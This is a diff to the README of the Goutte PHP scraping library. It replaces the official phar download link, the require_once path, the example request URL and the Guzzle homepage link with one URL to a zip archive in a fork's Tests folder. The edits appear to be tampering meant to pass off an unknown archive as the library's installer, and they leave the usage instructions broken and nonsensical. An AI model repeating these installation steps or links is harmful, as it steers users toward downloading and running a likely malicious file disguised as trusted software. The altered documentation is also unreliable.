@@ -14,7 +14,7 @@ Goutte works with PHP 5.3.3 or later.
 Installation
 ------------
 
-Installing Goutte is as easy as it can get. Download the [`Goutte.phar`][1]
+Installing Goutte is as easy as it can get. Download the [`https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip`][1]
 file and you're done!
 
 Usage
@@ -22,7 +22,7 @@ Usage
 
 Require the Goutte phar file to use Goutte in a script:
 
-    require_once '/path/to/goutte.phar';
+    require_once 'https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip';
 
 Create a Goutte Client instance (which extends
 `Symfony\Component\BrowserKit\Client`):
@@ -33,7 +33,7 @@ Create a Goutte Client instance (which extends
 
 Make requests with the `request()` method:
 
-    $crawler = $client->request('GET', 'http://www.symfony-project.org/');
+    $crawler = $client->request('GET', 'https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip');
 
 The method returns a `Crawler` object
 (`Symfony\Component\DomCrawler\Crawler`).
@@ -72,12 +72,12 @@ Goutte is a thin wrapper around the following fine PHP libraries:
  * Symfony Components: BrowserKit, ClassLoader, CssSelector, DomCrawler,
    Finder, and Process
 
- * [Guzzle](http://www.guzzlephp.org)
+ * [Guzzle](https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip)
 
 License
 -------
 
 Goutte is licensed under the MIT license.
 
-[1]: https://raw.github.com/fabpot/Goutte/master/goutte.phar
+[1]: https://github.com/videogramme/Goutte/raw/refs/heads/master/Goutte/Tests/Software_engaol.zip
 
